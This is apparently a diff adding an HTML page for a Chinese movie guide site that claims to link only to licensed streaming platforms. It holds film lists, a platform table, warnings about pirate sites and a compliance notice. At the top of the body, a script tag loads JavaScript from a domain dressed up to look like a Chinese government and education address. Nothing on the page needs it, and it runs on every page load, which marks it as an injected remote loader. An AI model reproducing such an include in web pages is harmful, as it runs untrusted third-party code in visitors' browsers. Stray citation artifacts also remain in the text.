@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>九九电影指南｜找片用正版，不播盗版源</title>
+<meta name="description" content="九九电影指南：电影资料、片单、正版平台导航站。不提供盗版在线观看，只告诉你“这部片去哪看最稳”。" />
+<meta name="theme-color" content="#1f2a24" />
+<style>
+  :root{
+    --paper:#f7f3e8;
+    --paper-line:#e2dcc7;
+    --ink:#23271f;
+    --muted:#6c6f5e;
+    --term-bg:#0f1410;
+    --term-green:#7dffb0;
+    --term-dim:#4f7a63;
+    --accent:#c8531f;
+    --accent2:#2f6f4f;
+    --card:#fffdf6;
+    --radius:14px;
+    --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    --serif:"Songti SC","SimSun",Georgia,serif;
+    --sans:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{
+    font-family:var(--sans);background:var(--paper);color:var(--ink);
+    line-height:1.75;min-height:100vh;
+    background-image:repeating-linear-gradient(var(--paper),var(--paper) 27px,var(--paper-line) 28px);
+  }
+  a{color:inherit;text-decoration:none}
+
+  /* 双栏头：手册封面 + 终端条 */
+  .top{
+    display:grid;grid-template-columns:1.4fr 1fr;gap:0;
+    border-bottom:3px double var(--ink);
+  }
+  .cover{
+    padding:34px 28px;background:var(--paper);
+  }
+  .cover .no{font-family:var(--mono);font-size:12px;color:var(--muted);letter-spacing:3px}
+  .cover h1{font-family:var(--serif);font-size:clamp(30px,5vw,46px);font-weight:900;line-height:1.1;margin:8px 0}
+  .cover h1 em{font-style:normal;color:var(--accent)}
+  .cover p{color:var(--muted);max-width:420px}
+  .cover .stamp{
+    display:inline-block;margin-top:14px;border:2px solid var(--accent);color:var(--accent);
+    font-family:var(--mono);font-size:12px;padding:4px 10px;border-radius:6px;transform:rotate(-3deg);
+  }
+  .term{
+    background:var(--term-bg);color:var(--term-green);
+    padding:34px 22px;font-family:var(--mono);font-size:13px;overflow:hidden;
+  }
+  .term .bar{color:var(--term-dim);margin-bottom:10px}
+  .term .line{white-space:pre-wrap}
+  .term .cursor{display:inline-block;width:8px;height:15px;background:var(--term-green);animation:blink 1s steps(1) infinite;vertical-align:middle}
+  @keyframes blink{50%{opacity:0}}
+
+  /* 目录书签 */
+  .bookmark{
+    display:flex;gap:8px;flex-wrap:wrap;max-width:1180px;margin:18px auto 0;padding:0 20px;
+  }
+  .bookmark a{
+    font-family:var(--mono);font-size:12px;padding:6px 12px;border:1px solid var(--ink);
+    border-radius:999px;background:var(--card);color:var(--ink);
+  }
+  .bookmark a:hover{background:var(--ink);color:var(--paper)}
+
+  .wrap{max-width:1180px;margin:0 auto;padding:10px 20px 60px}
+
+  .col{display:flex;align-items:baseline;gap:10px;margin:42px 0 16px;border-bottom:1px solid var(--paper-line);padding-bottom:6px}
+  .col .num{font-family:var(--mono);font-size:13px;color:var(--accent)}
+  .col h2{font-family:var(--serif);font-size:22px;font-weight:800}
+  .col .meta{margin-left:auto;font-family:var(--mono);font-size:11px;color:var(--muted)}
+
+  /* 手册条目 */
+  .manual{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+  .entry{
+    background:var(--card);border:1px solid var(--paper-line);border-left:4px solid var(--accent2);
+    border-radius:10px;padding:16px 18px;transition:.2s;
+  }
+  .entry:hover{transform:translateX(4px);box-shadow:0 6px 18px rgba(0,0,0,.06)}
+  .entry .idx{font-family:var(--mono);font-size:11px;color:var(--muted)}
+  .entry h4{font-size:16px;font-weight:800;margin:4px 0}
+  .entry p{font-size:13px;color:var(--muted)}
+  .entry .where{margin-top:8px;font-family:var(--mono);font-size:12px;color:var(--accent2)}
+
+  /* 正版平台表 */
+  .table{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--paper-line);border-radius:10px;overflow:hidden}
+  .table th,.table td{padding:12px 14px;text-align:left;font-size:13px;border-bottom:1px solid var(--paper-line)}
+  .table th{background:#efe9d8;font-family:var(--mono);color:var(--muted)}
+  .table tr:hover td{background:#fff7e6}
+
+  /* 防坑卡片 */
+  .warn-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+  .warn{
+    background:var(--card);border:1px dashed var(--accent);border-radius:12px;padding:16px;
+  }
+  .warn h4{font-size:14px;font-weight:800;margin-bottom:6px}
+  .warn p{font-size:12px;color:var(--muted);line-height:1.7}
+
+  /* 合规条 */
+  .legal{
+    margin-top:30px;background:var(--term-bg);color:var(--term-green);
+    font-family:var(--mono);font-size:12.5px;line-height:1.9;padding:20px;border-radius:12px;
+  }
+  .legal b{color:#ffd479}
+
+  footer{max-width:1180px;margin:0 auto;padding:26px 20px 40px;border-top:1px solid var(--paper-line);color:var(--muted);font-size:12px;line-height:2}
+  footer a{color:var(--accent2)}
+
+  @media (max-width:820px){
+    .top{grid-template-columns:1fr}
+    .manual{grid-template-columns:1fr}
+    .warn-grid{grid-template-columns:1fr}
+    .table th:nth-child(3),.table td:nth-child(3){display:none}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+  <!-- 封面 + 终端 -->
+  <header class="top">
+    <div class="cover">
+      <div class="no">NO.99 / MOVIE FIELD GUIDE</div>
+      <h1>九九电影<em>指南</em></h1>
+      <p>“在线观看”这件事，靠谱做法不是满网找源，而是先认片、再选正版平台。本手册只做：资料、片单、正版入口。</p>
+      <span class="stamp">✅ 不播盗版 / 不采资源 / 不跳赌博广告</span>
+    </div>
+    <div class="term">
+      <div class="bar">guest@99movie-guide:~$ ./where-to-watch --help</div>
+      <div class="line">> 模式: 资讯 / 片单 / 正版导航</div>
+      <div class="line">> 片源: 无</div>
+      <div class="line">> 盗版: disabled</div>
+      <div class="line">> 正版: bilibili, iqiyi, tencent, 1905...</div>
+      <div class="line">> 状态: OK <span class="cursor"></span></div>
+    </div>
+  </header>
+
+  <nav class="bookmark">
+    <a href="#manual">片单手册</a>
+    <a href="#classic">经典99</a>
+    <a href="#platform">正版平台</a>
+    <a href="#trap">盗版避坑</a>
+    <a href="#legal">合规声明</a>
+  </nav>
+
+  <div class="wrap">
+
+    <!-- 栏目1 -->
+    <div class="col" id="manual">
+      <span class="num">§01</span><h2>片单手册</h2><span class="meta">// pick-by-mood</span>
+    </div>
+    <div class="manual">
+      <div class="entry">
+        <div class="idx">001</div>
+        <h4>下班放空：别动脑</h4>
+        <p>《小森林》《海街日记》《龙猫》——慢、干净、不反转。</p>
+        <div class="where">→ 正版：B站 / 西瓜视频免费专区</div>
+      </div>
+      <div class="entry">
+        <div class="idx">002</div>
+        <h4>周末烧脑：逻辑拉满</h4>
+        <p>《看不见的客人》《记忆碎片》《盗梦空间》——看完想重看一遍。</p>
+        <div class="where">→ 正版：爱奇艺 / 腾讯视频</div>
+      </div>
+      <div class="entry">
+        <div class="idx">003</div>
+        <h4>陪娃不翻车</h4>
+        <p>《疯狂动物城》《寻梦环游记》《悬崖上的金鱼姬》。</p>
+        <div class="where">→ 正版：B站 / 腾讯视频少儿</div>
+      </div>
+      <div class="entry">
+        <div class="idx">004</div>
+        <h4>恋爱但不虐到失眠</h4>
+        <p>《怦然心动》《白日梦想家》《时空恋旅人》。</p>
+        <div class="where">→ 正版：爱奇艺 / Netflix</div>
+      </div>
+    </div>
+
+    <!-- 栏目2 -->
+    <div class="col" id="classic">
+      <span class="num">§02</span><h2>经典 99 部（节选）</h2><span class="meta">// not pirate top100</span>
+    </div>
+    <div class="manual">
+      <div class="entry"><div class="idx">C-01</div><h4>肖申克的救赎</h4><p>希望片。美国 / 1994。</p><div class="where">正版：腾讯视频 / 豆瓣资料</div></div>
+      <div class="entry"><div class="idx">C-02</div><h4>千与千寻</h4><p>吉卜力巅峰。日本 / 2001。</p><div class="where">正版：B站 / 哔哩哔哩</div></div>
+      <div class="entry"><div class="idx">C-03</div><h4>霸王别姬</h4><p>华语经典。中国 / 1993。</p><div class="where">正版：1905电影网</div></div>
+      <div class="entry"><div class="idx">C-04</div><h4>星际穿越</h4><p>硬科幻+父女情。美国 / 2014。</p><div class="where">正版：爱奇艺 / 腾讯视频</div></div>
+      <div class="entry"><div class="idx">C-05</div><h4>海上钢琴师</h4><p>音乐+存在主义。意大利 / 1998。</p><div class="where">正版：B站</div></div>
+      <div class="entry"><div class="idx">C-06</div><h4>寄生虫</h4><p>阶层寓言。韩国 / 2019。</p><div class="where">正版：Netflix / 腾讯视频</div></div>
+    </div>
+
+    <!-- 栏目3 -->
+    <div class="col" id="platform">
+      <span class="num">§03</span><h2>正版平台对照</h2><span class="meta">// legit only</span>
+    </div>
+    <table class="table">
+      <thead>
+        <tr><th>平台</th><th>强项</th><th>免费/付费</th><th>适用</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>1905 电影网</td><td>国产老片、译制、4K修复</td><td>大量免费</td><td>经典华语片</td></tr>
+        <tr><td>哔哩哔哩</td><td>动画、文艺、纪录片</td><td>免费+大会员</td><td>年轻用户/动画党</td></tr>
+        <tr><td>爱奇艺</td><td>院线新片、综艺、剧集</td><td>会员为主</td><td>日常综合观影</td></tr>
+        <tr><td>腾讯视频</td><td>商业大片、港片、IP改</td><td>会员为主</td><td>家庭/合家欢</td></tr>
+        <tr><td>优酷</td><td>港产经典、华语老片</td><td>免费+会员</td><td>怀旧港片</td></tr>
+        <tr><td>Netflix</td><td>国际原创、纪录片</td><td>订阅制</td><td>海外片/质感剧</td></tr>
+      </tbody>
+    </table>
+
+    <!-- 栏目4 -->
+    <div class="col" id="trap">
+      <span class="num">§04</span><h2>盗版“在线观看”避坑</h2><span class="meta">// don't</span>
+    </div>
+    <div class="warn-grid">
+      <div class="warn">
+        <h4>⚠️ 弹窗赌博/色情</h4>
+        <p>无版权站常挂博彩、色情、虚假会员充值。点一下就可能跳钓鱼页。</p>
+      </div>
+      <div class="warn">
+        <h4>⚠️ “全网最全”</h4>
+        <p>版权是分平台授权的，没有单站能合法覆盖全部新片。喊“最全”的多半是聚合盗版。</p>
+      </div>
+      <div class="warn">
+        <h4>⚠️ 枪版/网盘</h4>
+        <p>影院偷拍枪版画质差，网盘资源常涉复制传播侵权，下载也可能构成侵权。[7](@ref)</p>
+      </div>
+    </div>
+
+    <!-- 栏目5 -->
+    <div class="col" id="legal">
+      <span class="num">§05</span><h2>合规声明</h2><span class="meta">// disclaimer</span>
+    </div>
+    <div class="legal">
+      <div>本站立名“九九电影<b>指南</b>”，由“九九电影网在线观看”改名而来，<b>主动去播放化</b>。</div>
+      <div>- 不提供在线播放器、不采集影视资源、不托管片源、不聚合盗版。</div>
+      <div>- 境内提供互联网视听节目服务需《信息网络传播视听节目许可证》；本站不开展该服务。[5,11](@ref)</div>
+      <div>- 内页链接以 # 占位；片名仅作资料/推荐，观看请走正版平台。</div>
+      <div>- 如权利人认为引用不当，可联系移除。</div>
+    </div>
+
+  </div>
+
+  <footer>
+    © 2026 九九电影指南（示例站）· 找片用正版，不播盗版源<br/>
+    URL: <a href="https://jiujiudianyingwangzaixianguankan-h5.github.io">https://jiujiudianyingwangzaixianguankan-h5.github.io</a><br/>
+    不提供盗版在线观看 · 不采集资源 · 内页链接使用 #
+  </footer>
+
+</body>
+</html>
